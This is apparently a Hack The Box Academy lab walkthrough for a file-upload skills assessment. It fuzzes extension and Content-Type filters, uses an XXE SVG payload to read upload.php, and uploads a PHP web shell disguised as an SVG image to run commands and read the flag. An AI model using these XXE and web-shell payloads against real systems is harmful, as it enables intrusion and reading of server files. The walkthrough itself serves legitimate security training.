
---

You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.

Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.

---

## Extra Exercise

Try to note down the main security issues found with the web application and the necessary security measures to mitigate these issues and prevent further exploitation.

---
## Question 1

### "Try to exploit the upload form to read the flag found at the root directory "/"."

After spawning the target machine, students need to visit its website's root page and click on "Contact Us", where images can be uploaded:

![File_Upload_Attacks_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_35.png)

When students try to upload an image, it gets uploaded and displayed directly after clicking the green icon, without having to submit the form, thus, students need not click on "SUBMIT":


![File_Upload_Attacks_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_36.png)

Checking the uploaded image's link, students will notice that it is saved as a base64 string, with its full path not being disclosed, thus, the uploads directory can't be determined:

![File_Upload_Attacks_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_37.png)

Subsequently, students need to start `Burp Suite`, set `FoxyProxy` to the preconfigured "BURP" profile, and click on the green icon to intercept the image upload request and send it to `Intruder` (`Ctrl` + `I`):

![File_Upload_Attacks_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_38.png)

After clearing the default payload markers, students need to test for whitelisted extensions by adding a payload marker before the dot, such that it becomes `§.jpg§`:

Then, students need to uncheck "URL-encode these characters", copy the items of the [PHP extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) list and paste them under `Payload Options`, then click "Start attack":

![File_Upload_Attacks_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_40.png)

![File_Upload_Attacks_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_41.png)

Students will notice that the responses for the requests of extensions `.pht`, `.phtm`, `.phar`, and `.pgif` don't contain "Extension not allowed" but rather "Only images are allowed":

![File_Upload_Attacks_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_42.png)

Thus, students need to choose one of the extensions to attempt bypassing the whitelist test, `.phar` will be used. Because any file with an extension not ending with that of an image can't be uploaded, the best attempt students can take is to name a shell file as `shell.phar.jpg`. However, this file can only be uploaded if the `Content-Type` header of the original image is not modified. Therefore, students need to fuzz the `Content-Type` header value. First, students need to add a payload marker around the value of `Content-Type`, such that it becomes `§image/jpeg§`:

![File_Upload_Attacks_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_43.png)

Then, students need to download [web-all-content-types.txt](https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt):

Code: shell

```shell
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
```

  Skills Assessment - File Upload Attacks

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt--2022-11-30 05:03:37--  https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt

Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt [following]
--2022-11-30 05:03:37--  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 58204 (57K) [text/plain]
Saving to: ‘web-all-content-types.txt’

web-all-content-types.txt    100%[==============================================>]  56.84K  --.-KB/s    in 0.001s  

2022-11-30 05:03:37 (59.6 MB/s) - ‘web-all-content-types.txt’ saved [58204/58204]
```

Subsequently, students need only to have content types that contain `image/`, so they need to use `grep`, copy the matching ones to the clipboard, and then paste them under "Payload Options" in `Burp Suite`:

Code: shell

```shell
cat web-all-content-types.txt | grep 'image/' | xclip -se c
```

  Skills Assessment - File Upload Attacks

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ cat web-all-content-types.txt | grep 'image/' | xclip -se c
```

![File_Upload_Attacks_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_44.png)

After clicking on "Start attack" (and making sure that "URL-encode these characters" is unchecked), students will notice that most responses are 190 bytes in size, containing the message "Only images are allowed", however, the responses for `image/jpg`, `image/jpeg`, `image/png`, and `image/svg+xml` are an exception, as the images got uploaded successfully:

![File_Upload_Attacks_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_45.png)

Since SVG images are allowed, and the uploaded images get reflected to the students, they need to attempt an SVG attack by creating an image called `shell.svg` with the following content to read the source code of the file `upload.php`:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
```

Students can use `cat` to save the `XML` code into a file:

Code: shell

```shell
cat << 'EOF' > shell.svg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
EOF
```

  Skills Assessment - File Upload Attacks

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ cat << 'EOF' > shell.svg
> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
> EOF
```

Subsequently, students need to upload `shell.svg`, however, when attempting to, they will receive the message "only images are allowed". To bypass this, students can change the extension from `.svg` to `.jpeg`:

Code: shell

```shell
mv shell.svg shell.jpeg
```

  Skills Assessment - File Upload Attacks

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ mv shell.svg shell.jpeg
```

![File_Upload_Attacks_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_46.png)

However, in the intercepted request, students need to change the filename to have the `.svg` extension and `Content-Type` to be `image/svg+xml`:

![File_Upload_Attacks_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_47.png)

After forwarding the request and checking its response, students will notice that they have the base64-encoded version of `upload.php`, thus, they need to decode it:

![File_Upload_Attacks_Walkthrough_Image_48.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_48.png)

Code: shell

```shell
echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K' | base64 -d
```

  Skills Assessment - File Upload Attacks

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K' |base64 -d

<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
```

From the decoded output, students will know that the uploads directory is `./user_feedback_submissions/`, and that the uploaded file names are prepended with the date `ymd`, which adds the current year in short format, the current month, and the current day. With this information, students now need to upload a PHP web shell so that they can execute commands by creating an SVG file that contains it:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
```

Students can use `cat` to save the exploit into a file:

Code: shell

```shell
cat << 'EOF' > shell.phar.svg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
EOF
```

  Skills Assessment - File Upload Attacks

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ cat << 'EOF' > shell.phar.svg
> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
> EOF
```

Subsequently, since the frontend does not allow `.svg` extensions, students need to change it to `.jpeg`:

Code: shell

```shell
mv shell.phar.svg shell.phar.jpeg
```

  Skills Assessment - File Upload Attacks

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ mv shell.phar.svg shell.phar.jpeg
```

![File_Upload_Attacks_Walkthrough_Image_49.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_49.png)

Within the intercepted request, students need to change back the extension to `.svg` for filename and make `Content-Type` to be `image/svg+xml`:

![File_Upload_Attacks_Walkthrough_Image_50.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_50.png)

After forwarding the request, students need to navigate to `http://STMIP:STMPO/contact/user_feedback_submissions/YMD_shell.phar.svg` and use the `cmd` URL parameter to execute commands, as in `http://STMIP:STMPO/contact/user_feedback_submissions/YMD_shell.phar.svg?cmd=ls+/`:

![File_Upload_Attacks_Walkthrough_Image_51.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_51.png)

Students will notice that the flag file exists in the root directory with the name `flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`, thus they need to fetch its contents, as in `http://STMIP:STMPO/contact/user_feedback_submissions/YMD_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`:

![File_Upload_Attacks_Walkthrough_Image_52.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_52.png)